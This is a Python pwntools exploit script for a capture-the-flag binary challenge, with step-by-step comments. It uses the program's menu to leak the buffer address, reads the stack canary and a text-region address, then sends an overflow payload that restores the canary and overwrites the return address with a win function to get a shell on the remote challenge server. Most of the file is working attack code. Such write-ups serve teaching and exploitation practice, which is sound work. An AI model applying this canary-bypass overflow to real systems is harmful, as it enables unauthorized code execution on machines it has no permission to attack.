#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When looking in binary ninja, there is a win function at address 0x76d. However,
# since PIE is enabled, this address will change each time we run, so we will have
# to calculate its address based on the offset from another address we leak.

# One of the options provided by the program is 'input data', which first asks for
# an int value 'len', and then reads in that many bytes from stdin into a buffer.
# Using this, we can then set the length of input as something very large like 1000,
# and then overflow the buffer by entering a large input.

# When overflowing this buffer and then attempting to exit the program, we can see
# that stack smashing has been detected, so there is a canary in place. Hence, we are
# going to have to leak the value of this canary beforehand.

# To leak the value of the canary, we know we have the option 'dump memory' which 
# given an address, will display the contents of it. So, we simply need to determine
# the address of the canary. To do so, we note that the program displays the address
# of our buffer when starting up, so if we find the offset the canary is from our
# buffer, we can determine the canary address based on this.

# In gdb, we can use the command 'canary' to display the address and value of the
# canary. NOTE: Make sure you don't run command 'canary' too early, as if you do the 
# canary won't have been loaded in yet, and the address will be incorrect (so step
# through the program a bit before doing so). 

# Given this, we know the address of the canary is 0xffffce90, and the address
# of our buffer is at 0xffffce27, so the offset is 0x69 (or 105). Hence, we can get
# the canary address by adding 105 to the buffer address given to us, and then passing
# this address as input into the program will allow us to display its contents using
# 'dump memory'.

# Once we have this canary value, we also need to determine the address of the win
# function. Unlike the canary address, we cannot calculate the address of the win
# function based on an offset of the leaked buffer address, as they are in different
# memory regions (buffer on stack, win function in text/data region). Hence, we need
# to leak an address in this region. To do so, we can use the 'print memory map'
# option in the program, which shows the address range for each memory region.
 
# Given an address in the text/data region, we can extract this and then calculate
# the offset from this to the win function. To do so, we use gdb's command 'x win'
# to get the address of the win function 0x5663776d, and the address we extract is
# 0x56637000. Hence, the offset is 0x76d (or 1901). So, to get the win function
# address we simply add 1901 to our leaked text/data region address.

# Given all of this information, we can then perform a buffer overflow where we
# make sure to overwrite the canary with its original value, and then the return
# address with the address of the win function.

# The script:

p = remote("plsdonthaq.me", 5002)

# We want to extract the 'useful stack pointer', which is the address of the buffer.
p.recvuntil("pointer ")
buffer = int(p.recvline()[:-1], 0)

# Since we know the canary is stored 105 bytes above the buffer, we add this offset to
# the buffers address.
canaryAddress = buffer + 105

# We then select command 'input data' and send the address of the canary as input.
p.sendline("a")
p.sendline(p32(canaryAddress))

# We use command 'dump memory' to display the contents of the canary address.
p.sendline("b")

# Here we extract the canary value given by the program.
p.recvuntil("memory at ")
p.recvuntil(": ")
canaryValue = u32(p.recv(4))

# Next we want to display the 'memory map'.
p.sendline("c")

# Within this memory map showm, we want to extract the first address shown, which is
# in the text/data region as required. Since it doesn't display the '0x', we need to
# add this to the front, as well as convert it from bytes to string using decode.
leakedAddress = int("0x" + p.recvuntil("-")[-9:-1].decode("utf-8"), 0)

# Using the offset we calculated, we can now get the win functions address.
win = leakedAddress + 1901

# Finally, we want to input our buffer overflow payload. This involves selecting the
# 'input data' option, then for the length selecting a large value such as 1000 bytes,
# and then finally sending our payload which overwrites the canary to its original
# value and overwrites the return address with the win function's address.
p.sendline("a")
p.sendline(b"1000")
p.sendline(b"A"*96 + p32(canaryValue) + b"A"*8 + p32(win))

# We then use command 'quit' to return to the win function which gives us shell access
p.sendline("d")

# Given we now have shell access, we can now get the flag
p.interactive()